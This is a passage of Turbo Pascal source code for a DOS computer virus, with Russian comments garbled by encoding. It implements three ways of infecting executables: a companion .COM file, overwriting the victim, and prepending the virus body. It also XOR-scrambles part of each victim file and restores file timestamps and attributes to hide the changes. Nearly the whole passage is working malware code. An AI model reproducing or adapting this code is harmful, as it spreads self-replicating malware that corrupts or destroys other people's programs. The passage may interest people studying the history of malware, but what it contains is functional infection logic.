   {----------------------------------------------------------------------------}
   procedure Crypt(n:string);
   const CS=2000;                              {à §¬¥à è¨äàã¥¬®£® ªãáª }
   var c:file;                                 {è¨äàã¥¬ë© ä ©«}
       t:array[1..CS] of byte;                 {è¨äàã¥¬ë© ¬ áá¨¢}
       ch:byte;
   begin
   assign(c,n);
   getfattr(c,attr);                           {á®åà ï¥¬  âà¨¡ãâë}
   setfattr(c,$20);
   reset(c,1);
   seek(c,200);                                {¯à¨ª« ¤ë¢ ¥¬ £¥à®¨ç¥áª¨¥ ãá¨«¨ï}
   blockread(c,ch,1);                          { ¤«ï ¢ëç¨á«¥¨ï  ç «ì®© }
   for i:=1 to 10 do                           { ¯®§¨æ¨¨ è¨äà®¢ ¨ï ¦¥àâ¢ë}
     begin
     seek(c,ch+1);
     blockread(c,ch,1);
     end;
   seek(c,ch+300);
   blockread(c,t,CS);                          {ç¨â ¥¬ ªãá®ª ¨§ á¥à¥¤¨ë}
   for i:=1 to CS do t[i]:=t[i] xor 99;        {è¨äàã¥¬ íâ®â ªãá®ª}
   seek(c,ch+300);
   blockwrite(c,t,CS);                         {§ ¯¨áë¢ ¥¬ ªãá®ª}
   close(c);
   setfattr(c,attr);                           {¢®§¢à é ¥¬  âà¨¡ãâë}
   end;
   {----------------------------------------------------------------------------}
   procedure Exec_HLLC;
   begin
   Crypt(companio);                            {à áè¨äà®¢ë¢ ¥¬ ¦¥àâ¢ã}
   exec(companio,par);                         {§ ¯ãáª ¥¬ ¦¥àâ¢ã}
   Crypt(companio);                            {§ è¨äà®¢ë¢ ¥¬ ®¡à â® :)}
   end;
   {----------------------------------------------------------------------------}
   procedure Exec_HLLP;
   begin
   assign(f,paramstr(0));
   getfattr(f,attr);                           {á®åà ï¥¬  âà¨¡ãâë}
   setfattr(f,$20);
   reset(f,1);
   seek(f,filesize(f)-len);
   blockread(f,host,len);
   seek(f,filesize(f)-len);
   truncate(f);
   seek(f,0);
   blockwrite(f,host,len);
   close(f);
   exec(paramstr(0),par);
   assign(f,paramstr(0));
   reset(f,1);
   blockwrite(f,body,len);
   seek(f,filesize(f));
   blockwrite(f,host,len);
   close(f);
   setfattr(f,attr);
   end;
   {----------------------------------------------------------------------------}
   procedure Infect_HLLC(s:string);
   var st:string;
   begin
   fsplit(s,ds,ns,es);
   st:=ds+ns+'.COM';
   assign(g,st);rewrite(g,1);                  {á®§¤ ¥¬ ª®¬¯ ì®}
   blockwrite(g,body,len);                     {¯¨è¥¬ ¢¨àãá}
   close(g);
   Crypt(s);                                   {è¨äàã¥¬ ¦¥àâ¢ã}
   end;
   {----------------------------------------------------------------------------}
   procedure Infect_HLLO(s:string);
   begin
   assign(f,s);
   setfattr(f,$20);
   rewrite(f,1);
   blockwrite(f,body,len);
   close(f);
   end;
   {----------------------------------------------------------------------------}
   procedure Infect_HLLP(s:string);
   var time:longint;
   begin
   assign(f,s);
   getfattr(f,attr);
   setfattr(f,$20);
   reset(f,1);
   getftime(f,time);
   blockread(f,host,len);
   seek(f,0);
   blockwrite(f,body,len);
   seek(f,filesize(f));
   blockwrite(f,host,len);
   setftime(f,time);
   close(f);
   setfattr(f,attr);
   end;
   {----------------------------------------------------------------------------}
